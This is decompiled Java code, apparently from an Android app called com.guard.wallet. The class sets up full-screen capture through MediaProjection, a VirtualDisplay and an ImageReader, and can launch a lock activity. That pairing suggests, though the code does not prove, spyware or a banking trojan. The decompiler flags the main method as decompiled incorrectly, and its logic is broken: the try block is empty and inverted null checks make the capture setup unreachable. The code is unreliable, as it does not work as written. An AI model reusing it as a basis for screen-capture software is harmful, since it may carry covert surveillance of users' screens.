package p020x;

import a1.AbstractC0026q;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.Looper;
import android.view.Surface;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantLock;

/* renamed from: x.a */
/* loaded from: classes.dex */
public final class C0967a {

    /* renamed from: h */
    public static C0967a f2295h = new C0967a();

    /* renamed from: a */
    public ImageReader f2296a;

    /* renamed from: b */
    public MediaProjection f2297b;

    /* renamed from: c */
    public VirtualDisplay f2298c;

    /* renamed from: d */
    public final ReentrantLock f2299d = new ReentrantLock();

    /* renamed from: e */
    public final ReentrantLock f2300e = new ReentrantLock();

    /* renamed from: f */
    public final AtomicBoolean f2301f = new AtomicBoolean(false);

    /* renamed from: g */
    public final C0968b f2302g = new C0968b();

    /* renamed from: a */
    public static VirtualDisplay m1461a(MediaProjection mediaProjection, Surface surface) {
        ScreenMetricsVO m616e = AbstractC0249e.m616e();
        return mediaProjection.createVirtualDisplay("ScreenCapture", m616e.getWidth().intValue(), m616e.getHeight().intValue(), m616e.getDensity().intValue(), 18, surface, new C0970d(), m1463d());
    }

    /* renamed from: b */
    public static C0967a m1462b() {
        if (f2295h == null) {
            f2295h = new C0967a();
        }
        return f2295h;
    }

    /* renamed from: d */
    public static Handler m1463d() {
        if (Looper.myLooper() == null) {
            Looper.prepare();
        }
        Looper myLooper = Looper.myLooper();
        return myLooper != null ? new Handler(myLooper) : new Handler(Looper.getMainLooper());
    }

    /* renamed from: c */
    public final boolean m1464c() {
        return (this.f2297b == null || this.f2298c == null || this.f2296a == null) ? false : true;
    }

    /* renamed from: e */
    public final void m1465e() {
        MediaProjection mediaProjection = this.f2297b;
        if (mediaProjection != null) {
            mediaProjection.stop();
            this.f2297b = null;
        }
        VirtualDisplay virtualDisplay = this.f2298c;
        if (virtualDisplay != null) {
            virtualDisplay.release();
            this.f2298c = null;
        }
        ImageReader imageReader = this.f2296a;
        if (imageReader != null) {
            imageReader.close();
            this.f2296a = null;
        }
    }

    /* renamed from: f */
    public final void m1466f() {
        AtomicBoolean atomicBoolean = this.f2301f;
        if (atomicBoolean.get()) {
            return;
        }
        atomicBoolean.set(true);
        if (LockActivity.m331b() == null) {
            AbstractC0251g.d1(MainApplication.getInstance().getPackageName(), LockActivity.class.getName());
        } else {
            LockActivity.m331b().m333d();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:19:0x0048  */
    /* JADX WARN: Removed duplicated region for block: B:21:? A[RETURN, SYNTHETIC] */
    /* renamed from: g */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m1467g(Intent intent) {
        MediaProjection mediaProjection;
        MediaProjectionManager mediaProjectionManager;
        ReentrantLock reentrantLock = this.f2299d;
        if (!reentrantLock.tryLock()) {
            return;
        }
        if (m1464c()) {
            reentrantLock.unlock();
            return;
        }
        m1465e();
        try {
        } catch (Exception e2) {
            AbstractC0026q.m186s("x.a", e2);
        }
        if (AbstractC0251g.m653Z() != null && (mediaProjectionManager = (MediaProjectionManager) AbstractC0251g.m653Z().getSystemService("media_projection")) != null && (mediaProjection = mediaProjectionManager.getMediaProjection(-1, intent)) != null) {
            mediaProjection.registerCallback(new C0969c(), m1463d());
            this.f2297b = mediaProjection;
            if (mediaProjection == null) {
                ScreenMetricsVO m616e = AbstractC0249e.m616e();
                ImageReader newInstance = ImageReader.newInstance(m616e.getWidth().intValue(), m616e.getHeight().intValue(), 1, 2);
                this.f2296a = newInstance;
                newInstance.setOnImageAvailableListener(new C0968b(), m1463d());
                this.f2298c = m1461a(this.f2297b, this.f2296a.getSurface());
                return;
            }
            return;
        }
        mediaProjection = null;
        this.f2297b = mediaProjection;
        if (mediaProjection == null) {
        }
    }
}
